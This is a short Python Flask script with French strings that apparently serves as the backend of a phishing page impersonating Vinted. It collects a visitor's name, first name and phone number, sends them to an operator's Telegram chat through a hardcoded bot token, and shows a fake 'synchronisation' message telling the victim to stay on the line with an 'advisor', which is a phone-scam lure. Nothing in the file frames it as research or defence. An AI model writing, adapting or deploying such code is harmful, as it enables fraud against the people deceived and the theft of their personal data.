from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# Renseigne ici ton token et ton ID
TELEGRAM_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

def envoyer_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

@app.route('/', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        nom = request.form['nom']
        prenom = request.form['prenom']
        numero = request.form['numero']
        nom = request.form['nom']
        prenom = request.form['prenom']
        numero = request.form['numero']

        message = f"""
Nouvelle soumission Vinted 🔄

👤 Nom : {prenom} {nom}
📞 Numéro : {numero}
"""
        envoyer_telegram(message)

        return "synchronisation effectué avec succès, merci de garder la ligne avec votre conseiller lien pour la suite de votre verification ."

    return render_template('form.html')

if __name__ == '__main__':
    app.run(debug=True)
